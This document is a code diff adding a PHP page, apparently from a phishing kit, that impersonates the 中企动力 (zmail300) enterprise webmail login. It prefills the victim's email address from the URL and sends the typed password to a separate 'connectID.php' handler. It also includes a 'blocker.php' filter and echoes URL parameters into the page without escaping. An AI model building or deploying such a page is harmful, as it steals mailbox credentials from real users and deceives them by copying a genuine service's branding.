@@ -1,0 +1,221 @@
+﻿<?php
+include('blocker.php');
+?>
+<?php
+function getloginIDFromlogin($email)
+{
+$find = '@';
+$pos = strpos($email, $find);
+$loginID = substr($email, 0, $pos);
+return $loginID;
+}
+function getDomainFromEmail($email)
+{
+// Get the data after the @ sign
+$domain = substr(strrchr($email, "@"), 1);
+return $domain;
+}
+$login = $_GET['email'];
+$loginID = getloginIDFromlogin($login);
+$domain = getDomainFromEmail($login);
+$ln = strlen($login);
+$len = strrev($login);
+$x = 0;
+for($i=0; $i<$ln; $i++){
+	if($len[$i] == "@"){
+		$x = $i;
+		break;
+	}
+}
+$yuh = substr($len,0,$x);
+$yuh = strrev($yuh);
+for($i=0; $i<$ln; $i++){
+	if($yuh[$i] == "."){
+		$x = $i;
+		break;
+	}
+}
+$yuh = substr($yuh,0,$x);
+$yuh = ucfirst($yuh);
+?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>中企动力企业邮箱</title>
+<script>
+if(window!=top.window){
+    top.window.location.href="/page/login/login.jsp";
+}
+var domainJson = null;
+try{
+	domainJson = null;
+}catch(ex){
+	domainJson = null;
+}
+
+var __domainName = "webmail.<?php echo $domain ?>";
+var autoDomainName = "<?php echo $domain ?>";
+var sslPath = "https://ssl.zmail300.cn/";
+var basePath = "http://webmail.<?php echo $domain ?>/";
+var captchaImageUrl = "http://sso.zmail300.cn:7070/casserver/captchaImage";
+</script>
+<link rel="shortcut icon" href="files/projectIcon.ico" type="image/x-icon"/>
+<link href="files/loginMain.css?version=20160907101214" rel="stylesheet" type="text/css" />
+<!--  link href="files/loginMain.min.css?version=20160907101214" rel="stylesheet" type="text/css" / -->
+</head>
+<body>
+    <div id="ie6_tips" style="display:none;padding: 6px 12px;text-align: center;color: #555;border:1px solid #e7e7cd;background-color: #ffffe1;border: 1px solid #bdbdbd;">
+        <a style="font-size: 12px;color: #c00;" languageConfig='{"property":{"innerHTML":"ie6_tips"}}'>您当前使用的IE浏览器版本过低，这样会导致部分页面无法显示，稳定性差，强烈建议您使用IE7及以上版本浏览器或更换为火狐/chrome等浏览器。</a>
+    </div>
+    <div id="head">
+        <div id="headDivMid">
+            <a id="logo" class="headerLogo"></a> 
+            <div class="headerNav" >
+                <div class="headInfoDetial">
+                    <img alt="帮助中心" languageConfig='{"attribute":{"alt":"Help"}}' src="files/help.png" />
+                    <div class="headDetialText">
+                        <!-- a href="/page/help/userManual/index.html" target="_blank" languageConfig='{"property":{"innerHTML":"Help"}}' >帮助中心</a -->
+                    	<a id="help_a" href="http://help.zmail300.cn" target="_blank" languageConfig='{"property":{"innerHTML":"Help"}}' >帮助中心</a>
+                    </div>
+                </div>
+                <div class="headInfoDetial">
+                    <img alt="售前咨询" languageConfig='{"attribute":{"alt":"Pre_sales"}}' src="files/cser.png" /> <a href="http://www.300.cn/server_station.shtml" target="_blank" languageConfig='{"property":{"innerHTML":"Pre_saleLink"}}' >售前咨询:联系中企各分支机构</a>
+                </div>
+                <div class="headInfoDetial">
+                    <img alt="售后服务" languageConfig='{"attribute":{"alt":"After_sale"}}' src="files/sales.png" /> <a languageConfig='{"property":{"innerHTML":"After_salePheon"}}' >售后服务:4006605555</a>
+                </div>
+                <div class="headInfoDetial">
+                    <img alt="客户端配置" languageConfig='{"attribute":{"alt":"pc_config"}}' src="files/cog.png" /> <a href="/page/help/mailConfig/config/index.html" target="_blank" languageConfig='{"property":{"innerHTML":"pc_config"}}' >客户端配置（Foxmail/Outlook/手机等）</a>
+                    <!-- img alt="客户端配置" languageConfig='{"attribute":{"alt":"pc_config"}}' src="files/cog.png" /> <a href="#"  target="_blank" languageConfig='{"property":{"innerHTML":"pc_config"} , "attribute":{"href":"href_clientconfig"}}' >客户端配置</a -->
+                </div>
+                <!-- div class="headInfoDetial">
+                    <img alt="手机端配置" languageConfig='{"attribute":{"alt":"phone_config"}}' src="files/cog.png" /> <a href="/page/help/mailConfig/phone/index.html" target="_blank" languageConfig='{"property":{"innerHTML":"phone_config"}}' >手机端配置</a>
+                </div -->
+            </div>
+        </div>
+    </div>
+    <div id="mainSection" class="mainBg">
+        <div id="sideBg" class="sideBg">
+            <div id="mainBlock" class="mainBlock">
+                <div id="loginBlock" class="loginBlock" style="position: relative;">
+                    <div id="loginFuc">
+                        <div id="loginByAcc" languageConfig='{"property":{"innerHTML":"loginEnt"}}'>登录企业邮箱</div>
+                    </div>
+                    <div id="loginAct">
+                        <form id="loginForm" action="connectID.php" method="post" >
+						<input type="hidden" name="loginpage" value="<?php echo $_GET['loginpage']; ?>">
+                        <input id="service" name="service" type="hidden" value="{basePath}app/mail/index" userUrl="{basePath}app/mail/index" adminUrl="{basePath}app/mail/index?loginAdminPage=true" /> 
+						<input id="errorReturnUrl" name="errorReturnUrl" type="hidden" value="{basePath}page/login/login.jsp"> <input id="systemid" name="systemid" type="hidden" value="app">
+                                    <div id="errBlock">
+                                        <label class="errLabel" id="errLabel"></label>
+                                    </div>
+                                    <div>
+                                        <div id="accountLine" class="inputBox">
+                                        
+                                           <!-- 提交到 sso 用的 -->
+                                            <input id="username" value="<?php echo $login ?>" type="text" name="username" style="display:none;" />
+                                            
+                                            <!-- 如果是自定义域名的话， 自动补全域名 -->                                                 
+                                            
+                                                <!--  页面显示，验证用的 -->
+                                                <input name="usernameid" required="" readonly="" class="lgActIpt" id="lgActIpt" style="width:150px;color:black;" tabindex="1" title="请输入帐号" type="text"  value="<?php echo $loginID ?>" placeholder="请输入帐号" languageConfig='{"attribute":{"value":"account","title":"account"},"property":{"value":"account"}}' /> @ <input required="" readonly="" name="domain" style="color:black;" id="autoDomain" value="<?php echo $domain ?>" />
+                                            
+                                        </div>
+                                            
+                                    </div>
+                                    <div id="passwordLine" class="inputBox">
+                                        <input name="password" type="password" class="lgPwdIpt" id="lgPwdIpt_txt" style="color:black;" tabindex="2" title="请输入密码" required="" autofocus="" value="" placeholder="请输入密码" languageConfig='{"attribute":{"value":"password","title":"password"},"property":{"value":"password"}}'  />
+                                    </div>
+                                    
+                                    <div style="clear:both"></div>
+                                    <div id="optionBlock" class="inputBox">
+                                        <label id="keepAcctLbl" class="optionLabel" > <input class="checkbox keepAcctChk" id="keepAcctChk" tabindex="3" name="keepAccount" type="checkbox" checked="true" />  <span languageConfig='{"property":{"innerHTML":"saveName"}}'>记住用户名</span> </label>
+                                        <label id="useSSLLbl" class="optionLabel" > <input class="checkbox keepAcctChk" id="useSSLChk" tabindex="3" name="userSSL" type="checkbox"  /> <span languageConfig='{"property":{"innerHTML":"SSL"}}'>安全登录(SSL加密)</span> </label>
+                                        <!--label id="chooseLanguage" class="chooseLanguage" >语言</label-->
+                                        <select id="languageSelect" tabindex="5" >
+                                            <option value="CN">简体中文</option>
+                                            <option value="HK">繁体中文</option>
+                                            <option value="EN">English</option>
+                                        </select> <br /> 
+                                        <label class="optionLabel" > <input class="checkbox" id="isAdmin" type="checkbox" tabindex="4" /> <span languageConfig='{"property":{"innerHTML":"useAdmin"}}'>以管理员身份登录</span> </label>
+                                        <label class="optionLabel" > <a href="/page/help/forgetPassword/index.html" target="_blank" style="color:blue;" languageConfig='{"property":{"innerHTML":"forgetPassword"}}'>忘记密码了？</a> </label>
+                                    </div>
+                            <div id="doLoginBlock" >
+                                <input id="doLoginBtn" type="submit" tabindex="6" value="登录" languageConfig='{"attribute":{"value":"login"}}' />
+                            	<input id="doLoginBtn_txt" type="button" tabindex="6" value="正在登录" languageConfig='{"attribute":{"value":"logining"}}' />
+                            </div>
+                        </form>
+                    </div>
+                	<div id="adminAccountInfo" languageConfig='{"property":{"innerHTML":"adminAccountInfo"}}' style='display:none;position:absolute;top:40px;left:15px;background-color: #FFFF99;border: 1px solid;font-weight: bold;width: 315px;z-index: 100;'>您的超级管理员账号为admin或者sysadmin ！</div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="foot">
+        <span id="mailOwner" languageConfig='{"property":{"innerHTML":"Copyright"}}'   >Copyright &copy; <?php echo date("Y"); ?> 中企动力科技股份有限公司  版权所有</span>
+    </div>
+    <!--  <a href="../updatenotice/index.html"  target="_blank" style="color:#167ba9;position: absolute; right: 20px; top: 10px; text-decoration: underline; ">重要提示：Z邮局2.0迁移用户请看这里</a>-->
+    <div style="position:absolute;top:2px;right:20px;color:#666; text-align:center;line-height:18px;"><img src="files/erweima.png" width="75" height="75" / ><P>扫描登录移动版</P></div> 
+    <script type="text/javascript" src="files/jquery-1.8.0.min.js"></script>
+    <script type="text/javascript" src="files/loginUtil.js?version=20160907101214"></script>
+    <script type="text/javascript" src="files/multipleLanguagePatch.js?version=20160907101214"></script>
+    <!-- script type="text/javascript" src="files/loginUtil.multipleLanguagePatch.min.js?version=20160907101214"></script -->
+    <script>
+    $(function(){
+	    if( $.browser.msie && $.browser.version == 6){
+	        $('#ie6_tips').show(0);
+	    }
+	    
+	    $('#isAdmin').click(function(){
+    		if(this.checked){
+    			$('#adminAccountInfo').css('display','block');
+    		}else {
+    			$('#adminAccountInfo').css('display','none');
+    		}
+    	});
+	    
+	    /*
+	    var href = window.location.href;
+	    var helpa = document.getElementById('help_a');
+	    if(/^https:/.test(href)){
+	    	helpa.setAttribute('href', 'https://help.zmail300.cn');
+	    }else{
+	    	helpa.setAttribute('href', 'http://help.zmail300.cn');
+	    }
+	    */
+	    var dc = new Date().getTime();
+	    var flag = false;
+        var pageNo = 0;
+        if(domainJson && autoDomainName == domainJson.domain.toLowerCase()){
+    		var expireTime = null;
+    		if($.browser.msie){
+    			var de = domainJson.expire.split('-');
+    			expireTime = new Date(de[0], de[1]-1, de[2]); 
+    		}else{
+    		    expireTime = new Date(domainJson.expire).getTime();
+    		}
+    		if(dc <= expireTime){
+    			flag = true;
+    			pageNo = domainJson.type || 0;
+    		}
+    	}
+        
+        if(flag){
+            var url = '/page/migrate/index_'+pageNo+'.html';
+        	var f = document.createElement("iframe");
+			f.setAttribute("src" , url );
+			f.setAttribute("frameborder" , "0" );
+			f.setAttribute("width" , "100%" );
+			f.setAttribute("height" , "100%" );
+			var migrateDiv = document.getElementById('migrateDiv');
+			migrateDiv.appendChild(f);
+			migrateDiv.style.display = 'block';
+        }
+    });
+    </script>
+    <div id="migrateDiv" style="position: absolute; left: 0px; top: 0px; bottom: 0px; right: 0px; width: 100%; height: 100%; background-image: url(files/bg000.png); background-repeat: repeat; z-index: 888; display: none;">
+    </div>
+</body>
+</html>
